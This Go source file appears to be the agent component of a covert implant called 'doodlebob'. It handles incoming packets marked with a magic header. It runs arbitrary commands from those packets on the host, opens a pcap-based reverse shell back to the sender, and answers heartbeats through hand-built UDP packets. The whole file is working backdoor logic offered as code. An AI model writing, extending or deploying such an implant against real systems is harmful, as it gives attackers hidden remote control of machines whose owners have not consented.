// This contains the logic for handling incoming messages from packets with a magic header
// Includes command execution, reverse shell, heartbeat
package agent

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/doodlebob/pkg/executor"
	"github.com/google/gopacket/layers"
)

// sendHeartbeat sends a heartbeat message to the control host
func sendHeartbeat(msg *message.Message) error {
	// Convert the ports to integers
	remotePort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("converting string to integer: %w", err)
	}
	localPort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("converting string to integer: %w", err)
	}

	// Set vars
	srcIP := net.ParseIP(msg.DstIP)
	srcPort := localPort
	dstIP := net.ParseIP(msg.SrcIP)
	dstPort := remotePort

	// Get route to destination IP
	iface, _, srcIP, err := network.LookupRoute(dstIP)
	if err != nil {
		return err
	}

	srcMAC := iface.HardwareAddr

	// Get default interface
	device, err := network.GetNetworkInterface(srcIP)
	if err != nil {
		return err
	}

	// Setup context variable
	ctx, cancel := context.WithTimeout(
		context.Background(),
		3*time.Second,
	)
	defer cancel()

	// Resolve next-hop
	nextHopMAC, err := network.ResolveNextHopMAC(ctx, dstIP)
	if err != nil {
		return err
	}

	if err := network.SendPacket(device, srcMAC, nextHopMAC, layers.EthernetTypeIPv4, srcIP, dstIP, srcPort, dstPort, network.UDP, []byte("heartbeat")); err != nil {
		return err
	}

	return nil
}

// handleMessage takes a message, dissects its fields, and sends the data to the proper function
func handleMessage(msg *message.Message) error {
	// Check that the IP address matches this host
	switch msg.DstIP {
	case network.LocalIP().IP.To4().String():
		switch msg.Type {
		// Sends a heartbeat back to the source host to test connectivity
		case message.Heartbeat:
			if err := sendHeartbeat(msg); err != nil {
				return fmt.Errorf("sending heartbeat: %w", err)
			}
		// Executes the command on the target host
		case message.Command:
			outputChan := make(chan []string, 1)
			go func() {
				out, ret := executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
				outputChan <- []string{out, ret}
			}()
		// Opens a reverse shell on port specified in packet
		case message.Shell:
			errChan := make(chan error, 1)
			go func(ip, port string) {
				if err := executor.OpenPcapReverseShell(msg); err != nil {
					errChan <- fmt.Errorf("opening reverse shell: %w", err)
					return
				}
			}(msg.SrcIP, msg.SrcPort)
			select {
			case err := <-errChan:
				return fmt.Errorf("handling reverse shell: %w", err)
			default:
				return nil
			}
		}
	default:
		return nil
	}
	return nil
}
